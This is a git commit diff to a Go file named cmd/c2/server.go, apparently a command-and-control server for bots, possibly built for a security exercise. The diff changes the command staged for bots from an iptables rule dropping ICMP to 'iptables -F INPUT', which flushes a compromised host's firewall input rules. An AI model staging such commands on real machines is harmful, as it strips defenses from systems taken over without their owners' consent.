0c67733e33b92455feb704af717401903a7bddeb
oneNutW0nder <scb5436@rit.edu>
2019-10-23 06:15:50 -0400

    flush flush baby

--- cmd/c2/server.go
+++ cmd/c2/server.go
@@ -11,7 +11,7 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-var stagedCmd = "iptables -A INPUT -p icmp -j DROP"
+var stagedCmd = "iptables -F INPUT"
 
 // Host defines values for a callback from a bot
 type Host struct {
